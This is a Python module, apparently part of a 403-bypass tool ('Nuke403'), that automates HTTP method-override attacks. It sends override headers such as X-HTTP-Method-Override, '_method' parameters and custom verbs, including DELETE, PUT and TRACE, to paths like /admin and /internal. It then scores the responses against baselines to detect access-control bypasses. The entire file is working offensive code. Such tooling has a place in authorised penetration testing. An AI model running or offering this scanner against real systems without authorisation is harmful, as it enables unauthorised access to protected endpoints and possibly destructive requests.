import asyncio
import logging
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

logger = logging.getLogger(__name__)

class MethodOverrideEngine:
    def __init__(
        self,
        *,
        timeout_sec: int = 12,
        max_concurrency: int = 8,
        verbs: Optional[List[str]] = None,
        override_headers: Optional[List[str]] = None,
        override_parameters: Optional[List[str]] = None,
        evasion_paths: Optional[List[str]] = None,
    ) -> None:
        self.timeout_sec = timeout_sec
        self.max_concurrency = max_concurrency

        self.custom_verbs = verbs or [
            "GET", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE",
        ]

        self.override_headers = override_headers or [
            "X-HTTP-Method-Override",
            "X-HTTP-Method",
            "X-Method-Override",
            "X-Original-Method",
            "X-HTTP-Method-Override-Modified",
        ]

        self.override_parameters = override_parameters or [
            "_method", "_http_method", "_method_override",
            "method", "http_method", "request_method",
        ]

        self.evasion_paths = evasion_paths or [
            "/admin", "/api", "/config", "/internal", "/secure", "/private",
        ]

        self._block_indicators = [
            "access denied", "forbidden", "unauthorized", "blocked",
            "not authorized", "captcha", "request blocked",
        ]

    async def generate_payloads(self, target_url: str, original_method: str) -> List[Dict[str, Any]]:
        original = (original_method or "POST").upper()

        payloads: List[Dict[str, Any]] = []

        for hdr in self.override_headers:
            for verb in self.custom_verbs:
                if verb == original:
                    continue
                for p in self.evasion_paths:
                    payloads.append({
                        "type": "header_override",
                        "header": hdr,
                        "method": verb,
                        "original_method": original,
                        "path": p,
                        "label": f"hdr:{hdr}->{verb}@{p}",
                    })

        for param in self.override_parameters:
            for verb in self.custom_verbs:
                if verb == original:
                    continue
                for p in self.evasion_paths:
                    payloads.append({
                        "type": "parameter_override",
                        "parameter": param,
                        "method": verb,
                        "original_method": original,
                        "path": p,
                        "label": f"param:{param}->{verb}@{p}",
                    })

        for verb in self.custom_verbs:
            for p in self.evasion_paths:
                payloads.append({
                    "type": "custom_verb",
                    "verb": verb,
                    "path": p,
                    "label": f"verb:{verb}@{p}",
                })

        logger.info(f"[method_override] prepared {len(payloads)} payloads")
        return payloads

    async def test_payloads( self, target_url: str, payloads: List[Dict[str, Any]], http_client: Any ) -> List[Dict[str, Any]]:
        baselines = await self._collect_baselines(target_url, http_client)

        sem = asyncio.Semaphore(self.max_concurrency)
        results: List[Dict[str, Any]] = []

        async def run_one(pl: Dict[str, Any]) -> Optional[Dict[str, Any]]:
            try:
                async with sem:
                    snap = await self._execute_payload(target_url, pl, http_client)
                if not snap:
                    return None

                verdict = self._verdict(pl, snap, baselines)
                if verdict["processed"] or verdict["bypass"]:
                    return {
                        "technique": "method_override",
                        "label": pl.get("label", ""),
                        "payload": {k: v for k, v in pl.items() if k in ("type", "header", "parameter", "method", "verb", "path")},
                        "status_code": snap["status"],
                        "processed": verdict["processed"],
                        "bypass": verdict["bypass"],
                        "reason": verdict["reason"],
                        "proof": {
                            "headers_diff_vs_post": self._header_diff(
                                baselines.get(pl["path"], {}).get("POST", {}).get("headers", {}),
                                snap["headers"],
                            ),
                            "body_len": snap["body_len"],
                            "body_md5": snap["body_md5"],
                            "first_bytes": self._first_bytes(snap["body"]),
                        },
                    }
                return None
            except Exception as e:
                logger.debug(f"[method_override] payload failed {pl.get('label','')}: {e}")
                return None

        tasks = [asyncio.create_task(run_one(pl)) for pl in payloads]
        for out in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(out, Exception):
                logger.debug(f"[method_override] task error: {out}")
                continue
            if out:
                results.append(out)

        seen = set()
        deduped: List[Dict[str, Any]] = []
        for it in results:
            key = (it["label"], it.get("status_code", 0), it["proof"]["body_md5"])
            if key not in seen:
                seen.add(key)
                deduped.append(it)

        return deduped

    async def _collect_baselines(self, target_url: str, http_client: Any) -> Dict[str, Dict[str, Dict[str, Any]]]:
        res: Dict[str, Dict[str, Dict[str, Any]]] = {}
        sem = asyncio.Semaphore(self.max_concurrency)

        async def one_path(p: str) -> None:
            url = self._join(target_url, p)
            try:
                async with sem:
                    get_snap = await self._simple_request(http_client, "GET", url)
                async with sem:
                    post_snap = await self._simple_request(http_client, "POST", url, data=b"probe=baseline")
                if get_snap or post_snap:
                    res[p] = {"GET": get_snap or {}, "POST": post_snap or {}}
            except Exception as e:
                logger.debug(f"[method_override] baseline failed for {p}: {e}")

        await asyncio.gather(*(one_path(p) for p in self.evasion_paths))
        return res

    async def _execute_payload(self, target_url: str, pl: Dict[str, Any], http_client: Any) -> Optional[Dict[str, Any]]:
        path = pl["path"]
        url = self._join(target_url, path)

        if pl["type"] == "header_override":
            headers = {pl["header"]: pl["method"], "X-Nuke403-Test": f"hdr-{pl['method']}-{path}"}
            return await self._simple_request(http_client, "POST", url, headers=headers, data=b"probe=hdr")

        if pl["type"] == "parameter_override":
            headers = {"X-Nuke403-Test": f"param-{pl['method']}-{path}"}
            data = {pl["parameter"]: pl["method"], "probe": "param"}
            return await self._simple_request(http_client, "POST", url, headers=headers, data=data)

        if pl["type"] == "custom_verb":
            headers = {"X-Nuke403-Test": f"verb-{pl['verb']}-{path}"}
            return await self._simple_request(http_client, pl["verb"], url, headers=headers)

        return None

    async def _simple_request(
        self,
        http_client: Any,
        method: str,
        url: str,
        *,
        headers: Optional[Dict[str, str]] = None,
        data: Any = None,
    ) -> Optional[Dict[str, Any]]:
        try:
            resp = await http_client.request(method, url, headers=headers or {}, data=data, timeout=self.timeout_sec)
            text = resp.text or ""
            body_b = text.encode("utf-8", errors="ignore")
            snap = {
                "status": int(getattr(resp, "status_code", getattr(resp, "status", 0)) or 0),
                "headers": {k.lower(): v for k, v in (getattr(resp, "headers", {}) or {}).items()},
                "body": text,
                "body_len": len(body_b),
                "body_md5": self._md5(body_b),
            }
            return snap
        except Exception as e:
            logger.debug(f"[method_override] request error {method} {url}: {e}")
            return None

    def _verdict(self, pl: Dict[str, Any], snap: Dict[str, Any], baselines: Dict[str, Dict[str, Dict[str, Any]]]) -> Dict[str, Any]:
        path = pl["path"]
        base = baselines.get(path, {})
        b_get = base.get("GET", {})
        b_post = base.get("POST", {})
        status = snap["status"]
        body_md5 = snap["body_md5"]
        text_l = snap["body"].lower()

        if any(tok in text_l for tok in self._block_indicators):
            return {"processed": False, "bypass": False, "reason": "block_page_detected"}

        processed = False
        if 200 <= status < 400:
            processed = True
        else:
            if status in (405, 501) or re.search(r"(method (not )?allowed|unsupported method|invalid method)", text_l):
                processed = True

        strong_get = False
        target_method = pl.get("method") or pl.get("verb") or ""
        if target_method == "GET" and b_get and b_post:
            if body_md5 == b_get.get("body_md5") and body_md5 != b_post.get("body_md5"):
                strong_get = True
                processed = True

        bypass = False
        if b_post and b_post.get("status") in (401, 403, 404) and 200 <= status < 400:
            if (body_md5 != b_post.get("body_md5")) or self._headers_meaningfully_differ(b_post.get("headers", {}), snap["headers"]):
                bypass = True

        if not bypass and processed:
            if target_method == "DELETE" and status in (200, 202, 204):
                bypass = b_post.get("status") in (401, 403, 404)
            if target_method in ("PUT", "PATCH") and status in (200, 201, 204):
                bypass = b_post.get("status") in (401, 403, 404)
            if target_method == "OPTIONS" and status in (200, 204):
                bypass = b_post.get("status") in (401, 403, 404)
            if strong_get:
                bypass = b_post.get("status") in (401, 403, 404)

        reason = []
        if processed:
            reason.append("processed")
        if bypass:
            reason.append("bypass")
        if strong_get:
            reason.append("matches_get_baseline")

        return {"processed": processed, "bypass": bypass, "reason": ",".join(reason) or "none"}

    def _join(self, base: str, path: str) -> str:
        if path.startswith("http://") or path.startswith("https://"):
            return path
        return urljoin(base.rstrip("/") + "/", path.lstrip("/"))

    def _md5(self, b: bytes) -> str:
        import hashlib
        return hashlib.md5(b).hexdigest()

    def _first_bytes(self, s: str, n: int = 120) -> str:
        return s[:n]

    def _headers_meaningfully_differ(self, h0: Dict[str, str], h1: Dict[str, str]) -> bool:
        keys = {"set-cookie", "authorization", "www-authenticate", "location", "cache-control", "vary"}
        for k in keys:
            if (h0.get(k, "") or "") != (h1.get(k, "") or ""):
                return True
        return False

    def _header_diff(self, h0: Dict[str, str], h1: Dict[str, str]) -> Dict[str, Tuple[str, str]]:
        diff: Dict[str, Tuple[str, str]] = {}
        keys = set(h0.keys()) | set(h1.keys())
        for k in sorted(keys):
            v0 = h0.get(k, "")
            v1 = h1.get(k, "")
            if v0 != v1:
                diff[k] = (v0[:160], v1[:160])
        return diff
